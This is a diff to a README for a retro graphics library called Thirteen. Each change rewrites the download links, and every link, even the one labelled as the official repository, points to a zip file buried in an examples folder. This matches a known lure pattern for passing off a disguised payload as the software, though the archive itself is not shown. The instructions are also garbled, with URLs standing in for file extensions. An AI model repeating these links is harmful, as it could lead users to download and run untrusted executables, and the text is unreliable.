@@ -1,6 +1,6 @@
 # 🎨 Thirteen - Simple Retro Graphics Interface
 
-[![Download Thirteen](https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip)](https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip)
+[![Download Thirteen](https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip)](https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip)
 
 ---
 
@@ -66,7 +66,7 @@ This guide focuses on helping you reach step 3 and get the software running.
 
 Click this button to visit the official release page for Thirteen:
 
-[![Download Thirteen](https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip)](https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip)
+[![Download Thirteen](https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip)](https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip)
 
 This page lists all available versions and files. Typically, you will find files grouped by system type like Windows, macOS, and Linux.
 
@@ -78,7 +78,7 @@ Below the release title, you will find one or more downloadable files with names
 
 - For Windows, files often end with `.exe` or `.zip`.
 - For macOS, look for `.dmg` or `.zip`.
-- For Linux, you may see `https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip` or `.AppImage`.
+- For Linux, you may see `https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip` or `.AppImage`.
 
 ### Step 3: Download the File
 
@@ -86,7 +86,7 @@ Click on the file name matching your system. The download will begin automatical
 
 ### Step 4: Extract or Open the File
 
-If the file is compressed (`.zip` or `https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip`), right-click it and choose “Extract” or “Open with Archive Manager” to unpack it.
+If the file is compressed (`.zip` or `https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip`), right-click it and choose “Extract” or “Open with Archive Manager” to unpack it.
 
 If the file is executable (`.exe`, `.AppImage`), you may need to grant permission to run it:
 
@@ -131,8 +131,8 @@ If problems continue, visit the GitHub repository’s "Issues" section for solut
 
 ## 🔗 Additional Resources
 
-- **Official GitHub Repository:** https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip
-- **Download Releases:** https://github.com/GC2211-ghuru/Thirteen/raw/refs/heads/main/Examples/Minesweeper/Software_1.3.zip
+- **Official GitHub Repository:** https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip
+- **Download Releases:** https://raw.githubusercontent.com/GC2211-ghuru/Thirteen/main/Examples/Minesweeper/Software_1.3.zip
 - **Documentation Included:** Look inside the downloaded files for manuals and examples.
 - **Community Support:** Open an issue or discussion on GitHub for help.
 
